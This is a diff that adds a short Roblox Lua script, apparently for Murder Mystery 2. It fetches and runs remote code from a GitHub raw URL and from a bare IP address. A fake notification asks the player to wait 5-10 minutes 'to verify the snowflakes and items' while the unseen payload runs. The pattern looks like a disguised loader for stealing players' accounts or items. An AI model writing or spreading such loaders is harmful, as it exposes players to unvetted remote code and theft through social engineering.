@@ -1,0 +1,13 @@
+local function s1() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/test", true))() 
+end 
+local function s2() 
+    game.StarterGui:SetCore("SendNotification", {
+    Title = "Wait!";
+    Text = "Wait 5-10 minutes to verify the snowflakes and items!";
+    Duration = 5
+})
+    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/mm2eventVisual.lua", true))() 
+end 
+task.spawn(s1)
+task.spawn(s2)
